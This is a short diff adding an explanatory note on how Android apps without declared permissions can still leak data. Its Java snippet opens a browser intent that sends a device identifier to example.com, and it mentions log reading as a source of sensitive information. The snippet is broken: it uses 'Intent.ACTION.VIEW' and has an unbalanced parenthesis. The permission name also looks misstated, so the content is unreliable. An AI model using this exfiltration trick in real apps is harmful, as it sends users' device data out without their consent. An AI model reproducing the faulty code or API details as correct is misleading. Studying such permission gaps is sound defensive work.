@@ -1,0 +1,11 @@
+The permissions in Android devices are designed to guarantee that those 
+Android apps without any declared
+permissions cannot do anything harmful to the mobile device. Or can they?
+
+Intent intent =new Intent(Intent.ACTION.VIEW,
+Uri.parse("http://example.com/?device_id=xxx");
+startActivity(intent);
+
+
+To read the logs, an app will only need to request android.permission.READ_LOG
+This can read by malicious apps for critical information
